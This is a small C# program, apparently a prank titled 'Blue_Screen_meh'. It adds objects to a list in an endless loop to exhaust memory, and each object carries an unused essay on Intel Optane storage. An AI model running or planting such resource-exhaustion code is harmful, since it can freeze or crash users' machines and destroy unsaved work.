using System;
using System.Collections.Generic;

namespace Blue_Screen_meh
{
    class Program
    {
        static void Main(string[] args)
        {
            List<Object> ramfillur = new List<Object>();
            while (true)
            {
                ramfillur.Add(new Object());
            }
        }
    }

    class Object
    {
        public Object()
        {
            string str = @"Optane Memory is a non-volatile, memory storage established in 2017 which benefits performance of High-Powered Computers (HPC) over other technologies (Mason et al., 2020). Yadin (2016) states the application of memory is to store running programs whilst enabling the executed program to store and recall data. This evaluation will consider the development of Optane, its benefits and its use in industry.
Development of this differs from other technologies in 2 key ways. Traditional dynamic random - access memory(DRAM) storage prioritises low latency speeds, closely matched by Optane in performance.Optane can also operate as a non -volatile storage device(Subedi et al., 2018), which shows the versatility compared to other technologies. With its hybrid approach, this hardware applies the advantages of storage and DRAM in an effective way.
The benefits in industry can be shown through a gain in performance.Servers depend on fast storage and handling of workload, where any limitations would be called a bottleneck. Wu et al. (2017) proves that advantages of Optane are present when used in high speed and capacity dependent applications, performing 367 % random read and 847 % random write when benchmarked against Hard Drive(HDD) storage.Workload handling increases were proven when using Optane, resulting in 560 % performance over HDD alone.The assistance of Optane to HDD storage evidently increases performance of industry servers and HPC, however these results were obtained in simulated conditions and may not accurately reflect real world results.
Using Optane in industry reduces costs and workload on DRAM whilst boosting performance of existing infrastructure.Buidu, a services company upgrading their advanced databases to explore AI in vehicles, stated it is a cost - effective solution to meet growing demand for their services and effectively scales existing HPCs to handle greater workloads(Anon, 2019).This statement illustrates the innovation and advancements of Optane, it can improve existing, outdated servers therefore increasing competitiveness of firms and reducing electronic waste(e - waste) due to underperforming machines.However, Buidu worked in collaboration with intel to deploy the use of Optane which may lead to biased claims.
 To conclude this evaluation, the innovation is beneficial to servers in industry assisting existing hardware, boosting efficiently of HPCs.Whilst results produced by Wu et al may be overestimated, real world application does show merit.
 Word Count: 381";
            
        }
    }
}
